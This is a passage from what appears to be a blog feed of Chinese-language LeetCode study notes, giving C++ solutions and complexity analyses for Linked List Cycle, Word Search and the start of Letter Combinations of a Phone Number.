id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h1><h2 id="時間複雜度"><a href="#時間複雜度" class="headerlink" title="時間複雜度"></a>時間複雜度</h2><p>在建構 Hash Table 的部分會去遍歷 <code>magazine</code> 的每個字元，並且插入 <code>unordered_map</code> 或更新字母出現數量，這些操作都是 $O(1)$，假設 <code>magazine</code> 長度為 $m$，則這段迴圈的複雜度為 $O(m)$</p><p>在比對 <code>ransomNote</code> 中字元的部分，也是透過迴圈去遍歷，每一次迴圈會去檢查對應字元是否存在於 <code>unordered_map</code> 中，如果有就更新 <code>unordered_map</code>中的字母出現頻率，這操作也會是 $O(1)$，因此這段程式碼的複雜度會是 $O(n)$，其中 $n$ 為 <code>ransomNote</code> 的長度。</p><p>因此整體時間複雜度會是 $O(m+n)$</p><h2 id="空間複雜度"><a href="#空間複雜度" class="headerlink" title="空間複雜度"></a>空間複雜度</h2><p>主要由 <code>unordered_map</code> 的大小決定，他負責儲存 <code>magazine</code> 中出現的字母以及出現頻率因此複雜度為 $O(K)$，其中 $K$ 為不同字元的數量，但題目限制只會出現小寫英文，那就可以視為 $O(1)$，因為只有26個字母。</p>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> String </tag>
            
            <tag> LeetCode </tag>
            
            <tag> Easy </tag>
            
            <tag> C++ </tag>
            
            <tag> Hash Table </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>鏈節串列循環 | Easy | LeetCode#141. Linked List Cycle</title>
      <link href="/posts/992d29db.html"/>
      <url>/posts/992d29db.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/141/question.jpeg"></p><p><img src="/img/LeetCode/141/question2.jpeg"></p><ul><li>題目難度: <code>Easy</code></li><li>題目敘述: 這題給定一個linked list 的 <code>head</code> 要求，判斷這個linked list 當中是否存在 Cycle。</li></ul><div class="note info flat"><p>這裡的 Cycle 代表，你能夠透過持續跟隨<code>next</code>指標走訪list，而重複的訪問到曾經訪問過的節點，則代表有Cycle</p></div><blockquote><p>另外，題目還說明了他們是用一個 <code>pos</code> 變數來去將一個linked list 讓Tail node接到特定index的節點上，這代表這題的cycle 只會從 tail node 往回接，而 <code>pos</code> 變數對我們而言不重要，因為它並不是這題能夠存取到的變數</p></blockquote><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><p>我的想法是這題可以透過記錄節點是否有走訪過來判斷是否有 Cycle，因為這題會將Tail node 接回其他node，因此如果有Cycle 必定會有節點重複走訪，且無法抵達 <code>NULL</code>。而儲存方式比較快的應該是用 Hash Table 來去實現。</p><h2 id="我的解法-Hash-Table"><a href="#我的解法-Hash-Table" class="headerlink" title="我的解法- Hash Table"></a>我的解法- Hash Table</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(NULL) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    unordered_map&lt;ListNode*, <span class="type">int</span>&gt; umap;</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">hasCycle</span><span class="params">(ListNode *head)</span></span>&#123;</span><br><span class="line">        <span class="keyword">struct</span> <span class="title class_">ListNode</span> *ptr = head;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(ptr != <span class="literal">NULL</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(umap.<span class="built_in">find</span>(ptr) != umap.<span class="built_in">end</span>())&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            umap[ptr] = ptr-&gt;val;</span><br><span class="line">            ptr = ptr-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>上面定義了一個 hash table 叫做 <code>umap</code> 他的Key與Value 分別為 <code>&lt;ListNode*, int&gt;</code>，分別儲存節點的位址以及節點值，但其實這題節點值也非必要，主要是靠節點位址來判斷是否重複訪問。</p><p>一旦指標 <code>ptr</code> 尚未抵達 tail node 時，就會先將節點位址以及節點值存放到 hash table，接著就移動到下一個節點</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">umap[ptr] = ptr-&gt;val;</span><br><span class="line">ptr = ptr-&gt;next;</span><br></pre></td></tr></table></figure><p>而一旦每次拜訪節點時，會去檢查這個節點是否存在於Hash table 當中，一旦找到就直接回傳 True</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(umap.<span class="built_in">find</span>(ptr) != umap.<span class="built_in">end</span>())&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="我的解法-Vector"><a href="#我的解法-Vector" class="headerlink" title="我的解法- Vector"></a>我的解法- Vector</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(NULL) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;ListNode*&gt; nodelist;</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">hasCycle</span><span class="params">(ListNode *head)</span></span>&#123;</span><br><span class="line">        <span class="keyword">struct</span> <span class="title class_">ListNode</span> *ptr = head;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(ptr != <span class="literal">NULL</span>)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;nodelist.<span class="built_in">size</span>(); i++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(ptr == nodelist[i]) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">                nodelist.<span class="built_in">push_back</span>(ptr);</span><br><span class="line">                ptr = ptr-&gt;next;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>這裡儲存方式使用 <code>vector</code> 但缺點就是在每次檢查時，都會耗費 $O(n)$ 時間，<code>n</code> 為 vector 長度，會隨節點數量增加而提升 </p><h2 id="其他做法-Floyd’s-Cycle-Finding-Algorithm"><a href="#其他做法-Floyd’s-Cycle-Finding-Algorithm" class="headerlink" title="其他做法 - Floyd’s Cycle-Finding Algorithm"></a>其他做法 - Floyd’s Cycle-Finding Algorithm</h2><p>其實就是 Two-Pointer 做法，只要 <strong>快跟慢指標在某個節點相遇，就代表有cycle</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(NULL) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">hasCycle</span><span class="params">(ListNode *head)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!head || !head-&gt;next) <span class="keyword">return</span> <span class="literal">false</span>; </span><br><span class="line">        ListNode *slow = head; </span><br><span class="line">        ListNode *fast = head;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (fast &amp;&amp; fast-&gt;next) &#123;</span><br><span class="line">            slow = slow-&gt;next;</span><br><span class="line">            fast = fast-&gt;next-&gt;next; </span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (slow == fast) &#123; </span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;  </span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><em>Hash Table</em><br><img src="/img/LeetCode/141/result1.jpeg"></p><p><em>Vector</em><br><img src="/img/LeetCode/141/result2.jpeg"></p><p><em>Two-Pointer</em><br><img src="/img/LeetCode/141/result3.jpeg"></p><h1 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h1><h2 id="時間複雜度"><a href="#時間複雜度" class="headerlink" title="時間複雜度"></a>時間複雜度</h2><p><em>Hash Table</em></p><ul><li>$O(N)$: 檢查和插入雜湊表都僅耗費 $O(1)$，但還是需要遍歷每個節點一次，如果Link list中有 N 個節點，則複雜度就會是 $O(N)$</li></ul><p><em>vector</em></p><ul><li>$O(N^2)$: 在遍歷 N 個節點的過程中，還會去 <code>nodelist</code> 檢查已儲存的 N-1 個元素，因此為 $O(N^2)$</li></ul><p><em>Two-pointer</em></p><ul><li>$O(N)$: 在最壞的情況下，<code>slow</code> 和 <code>fast</code> 指針最多需要遍歷整個List，當linked list中有環時，<code>fast</code> 會在某個時刻與 <code>slow</code> 相遇；如果沒有環，則 fast 最終會到達鏈表末尾。因此，時間複雜度為 $O(N)$，$N$為節點數量</li></ul><h2 id="空間複雜度"><a href="#空間複雜度" class="headerlink" title="空間複雜度"></a>空間複雜度</h2><p><em>Hash Table</em></p><ul><li>$O(N)$: 我們需要將所有 N 個節點的指針都存入 <code>unordered_map</code>，因此空間複雜度為 $O(N)$</li></ul><p><em>vector</em></p><ul><li>$O(N)$: 將所有 N 個節點指針存儲在 <code>nodelist</code> 中</li></ul><p><em>Two-pointer</em></p><ul><li>$O(1)$: 因為只使用了兩個額外的指針 (<code>slow</code> 和 <code>fast</code>) 來進行遍歷，不需要使用額外的資料結構來存儲鏈表的節點。因此，空間複雜度為 $O(1)$，即使用的空間量是常數。</li></ul>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> Easy </tag>
            
            <tag> C++ </tag>
            
            <tag> Linked List </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>查找字詞 | Medium | LeetCode#79. Word Search</title>
      <link href="/posts/4b53ee93.html"/>
      <url>/posts/4b53ee93.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/79/question1.jpeg"></p><p><img src="/img/LeetCode/79/question2.jpeg"></p><p><img src="/img/LeetCode/79/question3.jpeg"></p><ul><li>題目難度: <code>Medium</code></li><li>題目敘述: 題目給定一個 <code>m x n</code> 大小的字母網格 <code>board</code> 以及一個字串 <code>word</code>，如果在網格中存在 <code>word</code> 則回傳 <code>true</code>。</li></ul><div class="note info flat"><p>Word 可以由字母的相鄰Cell中組合而成，相鄰可以是水平相鄰或者是垂直相鄰。相同的Cell不可重複使用。</p></div><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><p>首先由於也是要嘗試<strong>多種不同組合</strong>，因此想法上還是會偏向 backtracking，**我的想法上覺得應該要先找出 <code>word</code> 中的第一個字是否存在於 <code>board</code> 之中，如果存在則可以先取得第一個字的座標 (在board上的位置)**，一旦有初始位置後，就可以去進行 backtracking嘗試看看各種鄰接組合。</p><p><img src="/img/LeetCode/79/algo.png"></p><p>組合方式可能會是上下左右，因此每次遞迴輸入時會有四種不同可能，分別是向左、向右、向上以及向下，而這個過程中應該也要確保沒有超出邊界。 而遞迴的中止條件，應該會是backtracking 樹狀結構深度 <code>depth</code> 與題目給定的<code>word</code> 長度一樣則停止，並回傳 <code>True</code>。</p><h2 id="我的解法"><a href="#我的解法" class="headerlink" title="我的解法"></a>我的解法</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">existhelper</span><span class="params">(<span class="type">int</span> depth ,vector&lt;vector&lt;<span class="type">char</span>&gt;&gt;&amp; board, string word, <span class="type">int</span> UpperIndex, <span class="type">int</span> InnerIndex)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>( depth == word.<span class="built_in">length</span>()) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//boundary check</span></span><br><span class="line">        <span class="keyword">if</span>(UpperIndex &lt;<span class="number">0</span> || InnerIndex &lt;<span class="number">0</span> || UpperIndex &gt;= board.<span class="built_in">size</span>() || InnerIndex &gt;= board[<span class="number">0</span>].<span class="built_in">size</span>()) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(board[UpperIndex][InnerIndex] != word[depth]) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="type">char</span> temp = board[UpperIndex][InnerIndex];</span><br><span class="line">        board[UpperIndex][InnerIndex] = <span class="string">&#x27;#&#x27;</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//backtracking</span></span><br><span class="line">        <span class="type">bool</span> found = ( <span class="built_in">existhelper</span>(depth+<span class="number">1</span>, board, word, UpperIndex+<span class="number">1</span>, InnerIndex) || </span><br><span class="line">        <span class="built_in">existhelper</span>(depth+<span class="number">1</span>, board, word, UpperIndex, InnerIndex+<span class="number">1</span>) || </span><br><span class="line">        <span class="built_in">existhelper</span>(depth+<span class="number">1</span>, board, word, UpperIndex, InnerIndex<span class="number">-1</span>) || </span><br><span class="line">        <span class="built_in">existhelper</span>(depth+<span class="number">1</span>, board, word, UpperIndex<span class="number">-1</span>, InnerIndex));</span><br><span class="line">        </span><br><span class="line">        board[UpperIndex][InnerIndex] = temp;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> found;   </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">exist</span><span class="params">(vector&lt;vector&lt;<span class="type">char</span>&gt;&gt;&amp; board, string word)</span></span>&#123;</span><br><span class="line">        <span class="comment">//find the init value</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt; board.<span class="built_in">size</span>();i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>; j&lt; board[i].<span class="built_in">size</span>();j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(board[i][j] == word[<span class="number">0</span>])&#123;</span><br><span class="line">                    <span class="keyword">if</span>(<span class="built_in">existhelper</span>(<span class="number">0</span>,board, word , i, j)) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>這裡透過兩個函數來實現題目的要求，首先 <code>exist</code> 函數負責先在矩陣內找出 <code>word</code>的第一個字的位置，而如果都沒有找到則回傳 <code>false</code>。一旦找到後就呼叫 <code>existhelper</code>函數進行backtracking。在初次呼叫函數過程中，會去將剛才找到的初始值的index <code>i</code>, <code>j</code>傳遞到函數中。</p><p><code>existhelper</code>函數主要負責回溯邏輯，以下是參數介紹:</p><ul><li><code>int depth</code>: 代表的組合數量</li><li><code>vector&lt;vector&lt;char&gt;&gt;&amp; board</code>: 題目給的單字網格，是一個矩陣</li><li><code>string word</code>: 為題目給予的字串，也是我們要找的目標</li><li><code>int UpperIndex</code>: 為單字網格的列</li><li><code>int InnerIndex</code>: 為單字網格的行</li></ul><p>首先判斷是否找到，也就是遞迴終止的條件就是當 <code>depth == word.length()</code>，一旦滿足就回傳 <code>true</code></p><p>接著我們可以先看 backtracking 的邏輯，<strong>下面主要會針對當前cell 移動到下一個cell的一共四種可能(上、下、左、右)進行遞迴呼叫</strong> 一旦有其中一個回傳true，就代表在相鄰cell中找到我們下一個字了，回傳結果會放到 <code>found</code> 這個變數。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//backtracking</span></span><br><span class="line"><span class="type">bool</span> found = ( <span class="built_in">existhelper</span>(depth+<span class="number">1</span>, board, word, UpperIndex+<span class="number">1</span>, InnerIndex) || </span><br><span class="line"><span class="built_in">existhelper</span>(depth+<span class="number">1</span>, board, word, UpperIndex, InnerIndex+<span class="number">1</span>) || </span><br><span class="line"><span class="built_in">existhelper</span>(depth+<span class="number">1</span>, board, word, UpperIndex, InnerIndex<span class="number">-1</span>) || </span><br><span class="line"><span class="built_in">existhelper</span>(depth+<span class="number">1</span>, board, word, UpperIndex<span class="number">-1</span>, InnerIndex));</span><br><span class="line">        </span><br></pre></td></tr></table></figure><p>而每次遞迴函數執行時，必須優先檢查當 index 是否有超出邊界，如果有就回傳 <code>false</code> ( <code>if(UpperIndex &lt;0 || InnerIndex &lt;0 || UpperIndex &gt;= board.size() || InnerIndex &gt;= board[0].size()) return false;</code>)。 接著就是每一層中需要判斷，你移動到的Cell中的字是否是你要的 <code>if (board[x][y] != word[depth]) return false;</code> 如果不是就回傳 <code>false</code>。</p><p>接下來的部份是我在第一次實作過程中沒有注意到的，就是題目有說 <strong>The same letter cell may not be used more than once.</strong> 所以在每一層搜尋過程中，必須先把你所使用到的字先排除或進行替換，這裡就是先另外建一個變數 <code>temp</code> 來暫時存放走訪的cell值，<strong>然後將當前走訪的Cell當中的字暫時替換成 <code>&#39;#&#39;</code>，表示這個位置已經被訪問過，來避免重複使用</strong>，而在 backtracking 完畢後再將這個值復原回來。最後回傳　<code>found</code> 變數。</p><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/79/result.jpeg"></p><h1 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h1><h2 id="時間複雜度"><a href="#時間複雜度" class="headerlink" title="時間複雜度"></a>時間複雜度</h2><ul><li>在最壞的情況下，程式需要檢查 <code>board</code> 中的每個格子，<strong>並從每個格子出發進行深度優先搜索（DFS）</strong>。DFS的時間複雜度是 $O(4^L)$，其中 $L$ 是單詞的長度，因為每個位置最多有四個方向可以嘗試。</li><li>考慮到整個網格有 <code>M x N</code> 個格子，所以整個演算法的最壞情況時間複雜度是 $O(M * N * 4^L)$</li></ul><h2 id="空間複雜度"><a href="#空間複雜度" class="headerlink" title="空間複雜度"></a>空間複雜度</h2><ul><li>主要遞迴深度決定，最多會有 $L$ 層遞迴深度，因為單詞的長度為 $L$。此外，每次遞迴中會暫時改變 <code>board</code> 中的值，但這不會增加額外的空間需求，因為修改後還會還原原始值。因此空間複雜度為 $O(L)$</li></ul><h1 id="結語"><a href="#結語" class="headerlink" title="結語"></a>結語</h1><p>看了發現其實寫的跟解答區的差不多，看完才發現其實會是根據網格的初始位置去做DFS，自己都沒意識到這是一個DFS XD。 但這題還是嘗試許久，對於 matrix 相關的應用也還沒很熟練 (雖然這題是考backtracking)，可能也是之後要去熟悉的目標。</p>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> C++ </tag>
            
            <tag> Medium </tag>
            
            <tag> backtracking </tag>
            
            <tag> recursion </tag>
            
            <tag> combinations </tag>
            
            <tag> dfs </tag>
            
            <tag> matrix </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>電話號碼的字母組合 | Medium | LeetCode#17. Letter Combinations of a Phone Number</title>
      <link href="/posts/aeee38d.html"/>
      <url>/posts/aeee38d.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/17/question.jpeg"></p><ul><li>題目難度: <code>Medium</code></li><li>題目敘述: 題目給定一個包含由數字 <code>2-9</code> 組成的連續字串 <code>digits</code>， 回傳所有可能的字母組合，回傳的組合不限順序。</li></ul><div class="note info flat"><p>這裡的字母可能對應到的就是題目給的電話號碼圖片，數字 <code>1</code> 跟 <code>0</code> 沒有對應的字母</p></div><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><p>提到 <strong>所有可能的組合數</strong> 這種問題就會想到 backtracking，由於題目中的電話號碼數字跟字母有對應關係，因此我的想法是，可以透過雜湊表來去保存這個mapping關係，接著再去進行組合。首先思考遞迴終止條件，<strong>遞迴終止條件就是已經窮盡給定的 <code>digits</code> 中的數字。</strong></p><p>接著在每一層中，應該要去嘗試數字對應的每一種字母，要取出來放入字串變數中，而這裡還需要注意針對雜湊表的存取。取出後接著就是遞迴呼叫下一層，實現backtracking來窮盡各種組合。</p><p><img src="/img/LeetCode/17/algo.png"></p><h2 id="我的解法"><a href="#我的解法" class="headerlink" title="我的解法"></a>我的解法</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    unordered_map&lt;string, vector&lt;string&gt;&gt; umap&#123;</span><br><span class="line">        &#123;<span class="string">&quot;2&quot;</span>, &#123;<span class="string">&quot;a&quot;</span>,<span class="string">&quot;b&quot;</span>,<span class="string">&quot;c&quot;</span>&#125;&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;3&quot;</span>, &#123;<span class="string">&quot;d&quot;</span>,<span class="string">&quot;e&quot;</span>,<span class="string">&quot;f&quot;</span>&#125;&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;4&quot;</span>, &#123;<span class="string">&quot;g&quot;</span>,<span class="string">&quot;h&quot;</span>,<span class="string">&quot;i&quot;</span>&#125;&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;5&quot;</span>, &#123;<span class="string">&quot;j&quot;</span>,<span class="string">&quot;k&quot;</span>,<span class="string">&quot;l&quot;</span>&#125;&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;6&quot;</span>, &#123;<span class="string">&quot;m&quot;</span>,<span class="string">&quot;n&quot;</span>,<span class="string">&quot;o&quot;</span>&#125;&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;7&quot;</span>, &#123;<span class="string">&quot;p&quot;</span>,<span class="string">&quot;q&quot;</span>,<span class="string">&quot;r&quot;</span>, <span class="string">&quot;s&quot;</span>&#125;&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;8&quot;</span>, &#123;<span class="string">&quot;t&quot;</span>,<span class="string">&quot;u&quot;</span>, <span class="string">&quot;v&quot;</span>&#125;&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;9&quot;</span>, &#123;<span class="string">&quot;w&quot;</span>,<span class="string">&quot;x&quot;</span>,<span class="string">&quot;y&quot;</span>,<span class="string">&quot;z&quot;</span>&#125;&#125;,</span><br><span class="line">    &#125;;</span><br><span class="line">    vector&lt;string&gt; result;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">letterhelper</span><span class="params">(<span class="type">int</span> depth, string current, string digits)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(depth == digits.<span class="built_in">length</span>())&#123;</span><br><span class="line">            result.<span class="built_in">push_back</span>(current);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        string digit = <span class="built_in">string</span>(<span class="number">1</span>, digits[depth]);</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt; umap[digit].<span class="built_in">size</span>(); i++)&#123;</span><br><span class="line">            <span class="built_in">letterhelper</span>(depth+<span class="number">1</span>, current+umap[digit][i], digits);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">vector&lt;string&gt; <span class="title">letterCombinations</span><span class="params">(string digits)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(digits.<span class="built_in">empty</span>()) <span class="keyword">return</span> result;</span><br><span class="line">        <span class="built_in">letterhelper</span>(<span class="number">0</span>, <span class="string">&quot;&quot;</span>, digits);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>我這裡首先透過 <code>unordered_map</code> STL 建立了hash table，名稱為 <code>umap</code>，記錄著電話號碼以及字母之間的關係。接著也宣告了一個用於回傳結果用的 <code>result</code>。 